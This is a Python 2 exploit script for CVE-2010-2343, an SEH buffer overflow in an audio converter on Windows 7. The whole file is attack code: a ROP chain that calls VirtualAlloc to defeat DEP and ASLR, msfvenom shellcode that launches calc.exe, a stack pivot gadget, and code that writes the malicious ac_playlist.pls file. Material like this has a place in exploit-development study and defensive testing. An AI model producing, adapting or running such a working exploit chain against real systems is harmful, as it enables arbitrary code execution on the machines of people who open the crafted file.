#!/usr/bin/env python2

# Exploit Title: Audio Converter SEH Overflow (DEP+ASLR)
# Date: 02/17/2023
# Exploit Author: NG
# Tested on: Windows 7 Professional Service Pack 1 x86 (no null bytes, some trick in the ROP using virtual alloc)
# CVE : CVE-2010-2343

import struct


def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      
      #[---INFO:gadgets_to_set_ecx:---]
      0x1008a53f,  # POP EAX # RETN [audconv.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x10038cfc,  # NEG EAX # RETN [audconv.dll] 
      0x1004bd5e,  # XCHG EAX,ECX # POP EDI # POP ESI # POP EBP # POP EBX # ADD ESP,20 # RETN [audconv.dll] 
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)

      #[---INFO:gadgets_to_set_esi:---]
      0x10082cb9,  # POP EDX # RETN [audconv.dll] 
      0x100952c4,  # ptr to &VirtualAlloc() [IAT audconv.dll]
      0x1003dd8b,  # MOV EAX,DWORD PTR DS:[EDX] # RETN [audconv.dll] 
      0x10037d05,  # XCHG EAX,ESI # RETN [audconv.dll] 


      #[---INFO:gadgets_to_set_edx:---]
      0x1008aa12,  # POP EAX # RETN [audconv.dll] 
      0xfffff001,  #
      0x100692c7,  # NEG EAX # RETN    ** [audconv.dll] **   |   {PAGE_EXECUTE_READ}
      0x1007c604,  # INC EAX # RETN
      0x10073a9c,  # XOR EDX,EDX # RETN    ** [audconv.dll] **   |   {PAGE_EXECUTE_READ}
      0x100216f9,  # ADC EDX,EAX # ADD AL,0 # ADD ESP,118 # RETN [audconv.dll] 
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)


      #[---INFO:gadgets_to_set_ebx:---]
      0x1008aa12,  # POP EAX # RETN [audconv.dll] 
      0xbebec1c0,  # eax <- -0x41413e40 (ebx is 0x41414141, we need to add eax to EBX and get ebx = 0x301)
      0x10082ca7,  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+8] # RETN    ** [audconv.dll] **  

      #[---INFO:gadgets_to_set_ebp:---]
      0x1007a3c8,  # POP EBP # RETN [audconv.dll] 
      0x1002debd,  # & push esp # ret  [audconv.dll]     

      #[---INFO:gadgets_to_set_edi:---]
      0x10029f9c,  # POP EDI # RETN [audconv.dll] 
      0x1003f2b9,  # RETN (ROP NOP) [audconv.dll]

      #[---INFO:gadgets_to_set_eax:---]
      0x1008aa12,  # POP EAX # RETN [audconv.dll] 
      0x90909090,  # nop

      #[---INFO:pushad:---]
      0x1002ef14,  # PUSHAD # RETN [audconv.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)


offset=4436

# msfvenom -p windows/exec cmd=calc.exe -e x86/alpha_mixed BufferRegister=ECX  -f python -v shellcode -a x86 --platform windows
shellcode =  b""
shellcode += b"\xda\xcf\xd9\x74\x24\xf4\x5e\x29\xc9\xb1\x31"
shellcode += b"\xbd\x86\x1f\xc9\x31\x31\x6e\x18\x03\x6e\x18"
shellcode += b"\x83\xee\x7a\xfd\x3c\xcd\x6a\x80\xbf\x2e\x6a"
shellcode += b"\xe5\x36\xcb\x5b\x25\x2c\x9f\xcb\x95\x26\xcd"
shellcode += b"\xe7\x5e\x6a\xe6\x7c\x12\xa3\x09\x35\x99\x95"
shellcode += b"\x24\xc6\xb2\xe6\x27\x44\xc9\x3a\x88\x75\x02"
shellcode += b"\x4f\xc9\xb2\x7f\xa2\x9b\x6b\x0b\x11\x0c\x18"
shellcode += b"\x41\xaa\xa7\x52\x47\xaa\x54\x22\x66\x9b\xca"
shellcode += b"\x39\x31\x3b\xec\xee\x49\x72\xf6\xf3\x74\xcc"
shellcode += b"\x8d\xc7\x03\xcf\x47\x16\xeb\x7c\xa6\x97\x1e"
shellcode += b"\x7c\xee\x1f\xc1\x0b\x06\x5c\x7c\x0c\xdd\x1f"
shellcode += b"\x5a\x99\xc6\x87\x29\x39\x23\x36\xfd\xdc\xa0"
shellcode += b"\x34\x4a\xaa\xef\x58\x4d\x7f\x84\x64\xc6\x7e"
shellcode += b"\x4b\xed\x9c\xa4\x4f\xb6\x47\xc4\xd6\x12\x29"
shellcode += b"\xf9\x09\xfd\x96\x5f\x41\x13\xc2\xed\x08\x79"
shellcode += b"\x15\x63\x37\xcf\x15\x7b\x38\x7f\x7e\x4a\xb3"
shellcode += b"\x10\xf9\x53\x16\x55\xf5\x19\x3b\xff\x9e\xc7"
shellcode += b"\xa9\x42\xc3\xf7\x07\x80\xfa\x7b\xa2\x78\xf9"
shellcode += b"\x64\xc7\x7d\x45\x23\x3b\x0f\xd6\xc6\x3b\xbc"
shellcode += b"\xd7\xc2\x5f\x23\x44\x8e\xb1\xc6\xec\x35\xce"


rop_chain = create_rop_chain()

stack_pivot= struct.pack('<I', 0x100646bb) # {pivot 3652 / 0xe44} :  # ADD ESP,0E44 # RETN    ** [audconv.dll] **   |   {PAGE_EXECUTE_READ}


buf = "A"*1380 
buf += rop_chain
buf += "\x90"*50     # Some nops due to stack corruption
buf += shellcode
buf += "B"*(offset - 1380 - len(rop_chain) - len(shellcode) -50)
buf += stack_pivot
buf += "C"*45000

f = open("ac_playlist.pls", "w")
f.write(buf)
f.close()
